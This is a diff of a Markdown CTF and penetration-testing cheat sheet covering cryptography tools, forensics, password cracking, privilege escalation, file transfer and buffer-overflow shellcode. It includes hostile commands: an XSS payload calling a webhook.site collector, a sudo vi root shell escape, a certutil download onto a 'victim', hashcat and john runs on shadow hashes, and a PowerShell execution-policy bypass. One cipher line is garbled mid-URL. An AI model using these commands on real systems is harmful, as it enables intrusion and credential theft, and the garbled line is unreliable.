@@ -13,8 +13,7 @@ tags:
   - web-security
   - image-forensics
   - Pentesting
-
-
+  - system-hacking
 ---
 
 # System Hacking
@@ -127,7 +126,10 @@ tags:
 
 # Cryptography
 * If there is word `caesar` in the question or hint, this can be a substitution cipher.
-  * Use this website www.dcode.fr/caesar-cipher to Bruteforce the hidden message.
+  * Use this website ww* This [site](https://www.guballa.de/vigenere-solver) is great at breaking Vigenère ciphers without knowing the key.
+* If you find `!` in the cipher text and cipher seems to be within certain range of Letters and appears to be transposition of a plain text, Use this website [Ceasar Box](https://www.dcode.fr/caesar-box-cipher)w.dcode.fr/caesar-cipher to Bruteforce the hidden message.
+* To solve One Time Pad : [OTP](http://rumkin.com/tools/cipher/otp.php)
+
 
 # Forensics
 * If there is a image given, try `file` comamnd on the image to learn more information.
@@ -135,10 +137,16 @@ tags:
    * Command `binwalk <IMAGE_NAME>`
 * If there is ntfs file,extract with 7Zip on Windowds. If there is a file with alternative data strems, we can use the command `dir /R <FILE_NAME>` and then we can this command to extract data inside it `cat <HIDDEN_STREAM> > asdf.<FILE_TYPE>`
 * Method to extract ntfs in Linux : `sudo mount -o loop <FILENAME.ntfs> mnt`
+* To extract data from Image files, we can use `zsteg <FILE_NAME>`
+* Javascript Deobfuscator [Jsnice](http://www.jsnice.org/) 
+* To check metadata `exiftool <FILE_NAME>`
+* GrepToWin : `strings <FILE_NAME> | grep flag{`
+* StegHide `steghide extract -sf <FILE_NAME>`
 
 # Password Cracking
 * If there is `JOHN` in the title/text/hint, its mostly reference to `JOHN the ripper` for bruteforce passwords/hashes.
   * Command : `./john -show <PASS_FILE>`
+  * Better Command : `john output.hash --wordlist=/usr/share/wordlists/rockyou.txt`
 * To crack Well known Hashes (CTF Related Password Cracking),use [Link](hashes.org)
 * To get System User Hashes, we can follow this method
   ```
@@ -161,15 +169,12 @@ tags:
   User:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
   [*] Cleaning up... 
   ```
-  
-# XSS Attack
-* If there is a website, with a text field to submit, we can try XSS Attack.
-  * Use any online HTTP Bin website like https://webhook.site/#!/
-  * ``` ""> <img src="https://webhook.site/19df1f1a-2ec8-453e-b85b-ed2cab66a5cc>"```
-  
-# Packet Capture
-* If usb keys are mapped with pcap, we can use this Article to extract usb keys entered: [Link](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)
-  * Example Command : `tskark.exe -r <FILE_NAME.pcapng> -Y "usb.transfer_types==1" -e "frame.time.epoch" -e "usb.capdata" -Tfields`
+* If we able to extract /etc/passwd and /etc/shadow file we can use
+  * Command : `unshadow <PASSWD> <SHADOW>`
+  * Use Hashcat to crack the password, here 500 is for format `$1$` Replace it accordingly.
+  ```
+  hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force
+  ```
   
 # Privilige Escalation
 * [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
@@ -217,41 +222,57 @@ tags:
   
   * To get Root from VI
   ```
-  www-data@enemy:/home/haris$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
+  www-data@enemy:$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
   ```
   or
   ```
-  www-data@enemy:/home/haris$ sudo /usr/bin/vi /var/www/html/anyrandomFile
+  www-data@enemy:$ sudo /usr/bin/vi /var/www/html/anyrandomFile
   Type Escape and enter :!/bin/bash
   ```
   * Use [Pspy](https://github.com/DominicBreuker/pspy) for Getting information on cron, proceses etc
 
 # Tools
+* Reconnoitre [Links](https://github.com/codingo/Reconnoitre) -- A security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
+   * `reconnoitre -t 10.10.10.37 -o `pwd` --services`
 * Total Commander - multi purpose terminal for Hacking. Link : www.ghisler.com
 * CTF Exploitation Framework : Github.com/Gallopsled/pwntools `pip install pwntools`
 * When using GDB, we can create "~/.gdbinit" file and add this line "set disassembly-flavor intel" to make intel synatx.
 * Dirbuster for enumeration web server Attacks.
+* [Gobuster](https://github.com/OJ/gobuster) for advanced enumeration
+* [Nmap Automator](https://github.com/21y4d/nmapAutomator)
+* 7z Password Cracking: Use tool `7z2john`
+* SSH Password Cracking: `/usr/share/john/ssh2john.py id_rsa > output.hash`
 
-## Recover Files from Deleted File Systems
+***
+
+### Recover Files from Deleted File Systems
 * To Extract Flag from the file system - `strings /dev/sdb`
 * Flag Recovery with regex `grep -a '[a-z0-9]\{32\}' /dev/sdb`
 * `ssh username@remote_address "sudo dcfldd -if=/dev/sdb | gzip -1 ." | dcfldd of=extract.dd.gz` -- Used to get from Remote Hosts
 * `gunzip -d extract.dd.gz`
 * `binwalk -Me extract.dd`
 
-## Transfer Files from Host to Target Machine
+### Transfer Files from Host to Target Machine
 * Use `python -m SimpleHTTPServer` in the host folder.
 * Use Apache and put files in `/var/www/html/` folder.
 * If Tomcat is Opened, upload the file/payload using the Admin panel.
 * If wordpress is running, upload the file as plugin.
 * In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
 
-## Powershell
+### Powershell
 * To bypass execution policy `powershell.exe -exec bypass`
 
-## BufferOverflow
+### BufferOverflow
 * To generate shellcode quickly, we can use..
   * `python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh))`
   * `(python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh()))" ;cat) | ./vuln`
+ 
+### XSS Attack
+* If there is a website, with a text field to submit, we can try XSS Attack.
+  * Use any online HTTP Bin website like https://webhook.site/#!/
+  * ``` ""> <img src="https://webhook.site/19df1f1a-2ec8-453e-b85b-ed2cab66a5cc>"```
   
+### Packet Capture
+* If usb keys are mapped with pcap, we can use this Article to extract usb keys entered: [Link](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)
+  * Example Command : `tskark.exe -r <FILE_NAME.pcapng> -Y "usb.transfer_types==1" -e "frame.time.epoch" -e "usb.capdata" -Tfields`
 
